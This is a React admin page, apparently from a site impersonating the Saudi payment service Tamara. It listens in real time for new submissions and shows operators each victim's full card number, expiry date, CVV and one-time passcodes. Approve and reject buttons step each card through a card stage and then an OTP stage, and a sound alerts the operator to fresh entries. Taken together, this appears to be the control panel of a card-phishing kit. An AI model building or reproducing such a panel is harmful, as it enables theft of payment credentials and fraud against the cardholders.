import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { SidebarProvider } from "@/components/ui/sidebar";
import { AdminSidebar } from "@/components/AdminSidebar";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Loader2, Check, X, CreditCard } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { format } from "date-fns";
import { ar } from "date-fns/locale";

interface PaymentAttempt {
  id: string;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  created_at: string;
}

interface OtpAttempt {
  id: string;
  otp_code: string;
  created_at: string;
}

interface TamaraPayment {
  id: string;
  cardholder_name: string;
  card_number: string | null;
  card_number_last4: string;
  expiry_date: string | null;
  cvv: string | null;
  otp_code: string | null;
  phone: string | null;
  total_amount: number;
  monthly_payment: number;
  company: string;
  payment_status: string;
  created_at: string;
  updated_at: string;
  payment_attempts: PaymentAttempt[];
  otp_attempts: OtpAttempt[];
}

const AdminTamaraPayments = () => {
  const navigate = useNavigate();
  const [payments, setPayments] = useState<TamaraPayment[]>([]);
  const [loading, setLoading] = useState(true);
  const [processingPayment, setProcessingPayment] = useState<string | null>(null);
  const { toast } = useToast();

  // دالة لتشغيل صوت إشعار مخصص لتمارا
  const playTamaraNotificationSound = () => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    // نغمة مختلفة ومميزة لتمارا (نغمة أعلى ومختلفة عن الطلبات العادية)
    oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
    oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1);
    oscillator.frequency.setValueAtTime(1200, audioContext.currentTime + 0.2);
    
    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 0.5);
  };

  useEffect(() => {
    const checkAuthAndFetchPayments = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/admin/login");
        return;
      }

      await fetchPayments();
      
      // Subscribe to realtime updates
      const channel = supabase
        .channel('tamara-payments-changes')
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'tamara_payments'
          },
          (payload) => {
            console.log('طلب تمارا جديد:', payload);
            
            // تشغيل الصوت المخصص لتمارا
            playTamaraNotificationSound();
            
            // إظهار إشعار كتابي
            toast({
              title: "🔔 طلب دفع تمارا جديد!",
              description: `تم استلام طلب دفع جديد من ${payload.new.cardholder_name}`,
              duration: 10000,
            });
            
            // تحديث البيانات تلقائياً
            fetchPayments();
          }
        )
        .on(
          'postgres_changes',
          {
            event: 'UPDATE',
            schema: 'public',
            table: 'tamara_payments'
          },
          () => {
            fetchPayments();
          }
        )
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'tamara_payment_attempts'
          },
          () => {
            fetchPayments();
          }
        )
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'tamara_otp_attempts'
          },
          () => {
            fetchPayments();
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    };

    checkAuthAndFetchPayments();
  }, [navigate]);

  const fetchPayments = async () => {
    try {
      const { data, error } = await supabase
        .from('tamara_payments')
        .select(`
          *,
          payment_attempts:tamara_payment_attempts(*),
          otp_attempts:tamara_otp_attempts(*)
        `)
        .order('created_at', { ascending: false });

      if (error) throw error;
      setPayments((data as any) || []);
    } catch (error) {
      console.error("Error fetching payments:", error);
      toast({
        title: "خطأ",
        description: "فشل في جلب بيانات الدفعات",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'approved' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على الدفعة بنجاح",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error approving payment:", error);
      toast({
        title: "خطأ",
        description: "فشل في الموافقة على الدفعة",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleReject = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الرفض",
        description: "تم رفض الدفعة",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error rejecting payment:", error);
      toast({
        title: "خطأ",
        description: "فشل في رفض الدفعة",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleApproveOtp = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'completed' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم تأكيد OTP",
        description: "تمت الموافقة على كود التحقق بنجاح",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error approving OTP:", error);
      toast({
        title: "خطأ",
        description: "فشل في الموافقة على كود التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleRejectOtp = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'otp_rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم رفض OTP",
        description: "تم رفض كود التحقق",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error rejecting OTP:", error);
      toast({
        title: "خطأ",
        description: "فشل في رفض كود التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'pending':
        return <Badge className="bg-yellow-500">قيد الانتظار</Badge>;
      case 'approved':
        return <Badge className="bg-green-500">تمت الموافقة</Badge>;
      case 'rejected':
        return <Badge className="bg-red-500">مرفوض</Badge>;
      case 'completed':
        return <Badge className="bg-blue-500">مكتمل</Badge>;
      case 'otp_rejected':
        return <Badge className="bg-orange-500">رفض OTP</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  return (
    <SidebarProvider>
      <div className="flex min-h-screen w-full" dir="rtl">
        <AdminSidebar />
        <div className="flex-1 p-8 bg-gray-50">
          <div className="max-w-7xl mx-auto">
            <div className="mb-8">
              <h1 className="text-3xl font-bold text-gray-900">دفعات تمارا</h1>
              <p className="text-gray-600 mt-2">إدارة والموافقة على دفعات تمارا</p>
            </div>

            <div className="grid gap-6">
              {payments.length === 0 ? (
                <Card>
                  <CardContent className="p-8 text-center text-gray-500">
                    لا توجد دفعات حتى الآن
                  </CardContent>
                </Card>
              ) : (
                payments.map((payment) => (
                  <Card key={payment.id} className="overflow-hidden">
                    <CardHeader className="bg-muted/50 border-b">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <CreditCard className="h-5 w-5 text-primary" />
                          <CardTitle className="text-lg">{payment.cardholder_name}</CardTitle>
                        </div>
                        {getStatusBadge(payment.payment_status)}
                      </div>
                      <CardDescription className="mt-1">
                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                      </CardDescription>
                    </CardHeader>

                    <CardContent className="p-6">
                      {/* معلومات أساسية */}
                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                          <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
                          <div className="font-bold text-sm text-gray-900 truncate" title={payment.company}>
                            {payment.company}
                          </div>
                        </div>
                        
                        {payment.phone && (
                          <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
                            <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
                            <div className="font-bold text-sm text-gray-900" dir="ltr">
                              {payment.phone}
                            </div>
                          </div>
                        )}
                        
                        <div className="bg-green-50 border border-green-200 rounded-lg p-3">
                          <div className="text-xs text-green-600 font-medium mb-1">المبلغ الشهري</div>
                          <div className="font-bold text-lg text-green-700">
                            {payment.monthly_payment} ر.س
                          </div>
                        </div>
                        
                        <div className="bg-orange-50 border border-orange-200 rounded-lg p-3">
                          <div className="text-xs text-orange-600 font-medium mb-1">المبلغ الإجمالي</div>
                          <div className="font-bold text-lg text-orange-700">
                            {payment.total_amount} ر.س
                          </div>
                        </div>
                        
                        {payment.otp_code && payment.card_number && (
                          <div className="bg-primary/10 border-2 border-primary rounded-lg p-3 md:col-span-2">
                            <div className="text-xs text-primary font-medium mb-1">كود التحقق الحالي</div>
                            <div className="font-bold text-2xl text-primary text-center tracking-widest">
                              {payment.otp_code}
                            </div>
                          </div>
                        )}
                      </div>

                      {/* محاولات الدفع */}
                      {payment.payment_attempts && payment.payment_attempts.length > 0 && (
                        <div className="mb-6 space-y-2">
                          <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600">
                            <CreditCard className="h-4 w-4" />
                            محاولات الدفع ({payment.payment_attempts.length})
                          </h3>
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                            {payment.payment_attempts.map((attempt, index) => (
                              <div key={attempt.id} className="bg-orange-50 border border-orange-200 rounded-lg p-3">
                                <div className="flex justify-between items-center mb-2">
                                  <span className="text-xs font-semibold text-orange-600">
                                    محاولة #{payment.payment_attempts!.length - index}
                                  </span>
                                  <span className="text-xs text-gray-500">
                                    {format(new Date(attempt.created_at), 'HH:mm', { locale: ar })}
                                  </span>
                                </div>
                                <div className="space-y-1.5 text-xs">
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">رقم البطاقة:</span>
                                    <span className="font-mono font-medium" dir="ltr">
                                      {attempt.card_number}
                                    </span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">الاسم:</span>
                                    <span className="font-medium truncate max-w-[120px]" title={attempt.card_holder_name}>
                                      {attempt.card_holder_name}
                                    </span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">الانتهاء:</span>
                                    <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">CVV:</span>
                                    <span className="font-mono font-medium">{attempt.cvv}</span>
                                  </div>
                                </div>

                                {/* أزرار الموافقة والرفض لكل بطاقة */}
                                {payment.payment_status === 'pending' && index === 0 && (
                                  <div className="flex gap-2 mt-3 pt-3 border-t border-orange-300">
                                    <Button
                                      onClick={() => handleApprove(payment.id)}
                                      disabled={processingPayment === payment.id}
                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                                    >
                                      {processingPayment === payment.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <Check className="h-3 w-3 ml-1" />
                                      )}
                                      موافقة
                                    </Button>
                                    <Button
                                      onClick={() => handleReject(payment.id)}
                                      disabled={processingPayment === payment.id}
                                      variant="destructive"
                                      className="flex-1 h-8 text-xs"
                                    >
                                      {processingPayment === payment.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <X className="h-3 w-3 ml-1" />
                                      )}
                                      رفض
                                    </Button>
                                  </div>
                                )}
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* محاولات OTP - تظهر فقط في صفحة /otp-verification */}
                      {payment.otp_attempts && payment.otp_attempts.length > 0 && payment.card_number && (
                        <div className="space-y-2">
                          <h3 className="font-semibold flex items-center gap-2 text-sm text-blue-600">
                            <Check className="h-4 w-4" />
                            محاولات OTP ({payment.otp_attempts.length})
                          </h3>
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3">
                            {payment.otp_attempts.map((attempt, index) => {
                              const isLatest = index === 0;
                              return (
                                <div 
                                  key={attempt.id} 
                                  className={`border rounded-lg p-3 ${
                                    isLatest 
                                      ? 'bg-blue-50 border-blue-300 ring-2 ring-blue-200' 
                                      : 'bg-gray-50 border-gray-200'
                                  }`}
                                >
                                  <div className="flex justify-between items-center mb-2">
                                    <span className={`text-xs font-semibold ${isLatest ? 'text-blue-600' : 'text-gray-500'}`}>
                                      {isLatest ? '🔥 الأحدث' : `محاولة #${payment.otp_attempts!.length - index}`}
                                    </span>
                                    <span className="text-xs text-gray-500">
                                      {new Date(attempt.created_at).toLocaleTimeString('ar-SA', {
                                        hour: '2-digit',
                                        minute: '2-digit',
                                      })}
                                    </span>
                                  </div>
                                  <div className="space-y-1.5 text-xs">
                                    <div className="flex justify-between items-center">
                                      <span className="text-gray-500">الكود:</span>
                                      <span className={`font-mono font-bold text-lg ${
                                        isLatest ? 'text-blue-600' : 'text-gray-600'
                                      }`}>
                                        {attempt.otp_code}
                                      </span>
                                    </div>
                                    <div className="text-xs text-gray-500 text-center">
                                      {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                    </div>
                                  </div>
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      )}

                      {/* أزرار الموافقة/الرفض على OTP - تظهر عند وجود محاولة OTP جديدة */}
                      {payment.payment_status === 'approved' && payment.otp_attempts && payment.otp_attempts.length > 0 && (
                        <div className="flex gap-3 mt-6 pt-4 border-t border-border">
                          <Button
                            onClick={() => handleApproveOtp(payment.id)}
                            disabled={processingPayment === payment.id}
                            className="flex-1 bg-green-600 hover:bg-green-700 h-10"
                          >
                            {processingPayment === payment.id ? (
                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
                            ) : (
                              <Check className="h-4 w-4 ml-2" />
                            )}
                            موافقة - OTP
                          </Button>
                          <Button
                            onClick={() => handleRejectOtp(payment.id)}
                            disabled={processingPayment === payment.id}
                            variant="destructive"
                            className="flex-1 h-10"
                          >
                            {processingPayment === payment.id ? (
                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
                            ) : (
                              <X className="h-4 w-4 ml-2" />
                            )}
                            رفض - OTP
                          </Button>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))
              )}
            </div>
          </div>
        </div>
      </div>
    </SidebarProvider>
  );
};

export default AdminTamaraPayments;
